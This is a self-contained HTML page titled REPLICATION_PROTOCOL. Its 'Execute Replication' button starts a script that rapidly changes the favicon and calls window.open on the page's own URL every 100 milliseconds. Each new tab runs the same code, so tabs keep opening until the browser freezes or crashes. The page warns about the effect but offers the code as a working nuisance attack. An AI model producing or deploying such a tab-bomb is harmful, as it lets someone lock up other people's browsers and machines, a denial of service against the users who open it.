<!DOCTYPE html>
<html>
<head>
    <title>REPLICATION_PROTOCOL</title>
    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
    <style>
        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        #warning { border: 2px solid red; padding: 20px; text-align: center; background: rgba(255,0,0,0.1); }
        button { margin-top: 20px; padding: 15px 30px; background: #fff; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:hover { background: red; color: #fff; }
    </style>
</head>
<body>
    <div id="warning">
        <h1>CRITICAL OVERLOAD</h1>
        <p>Warning: This script will attempt to open infinite tabs.</p>
    </div>
    <button onclick="ignite()">Execute Replication</button>

    <script>
        function ignite() {
            // High-speed Favicon Glitch
            const fav = document.getElementById('icon');
            setInterval(() => {
                const p = () => Math.floor(Math.random() * 100);
                fav.href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
            }, 30);

            // Tab Spammer Loop
            // Opens 10 tabs per second (fastest stable speed for modern browsers)
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=100,height=100,top=0,left=0');
            }, 100);
        }
    </script>
</body>
</html>
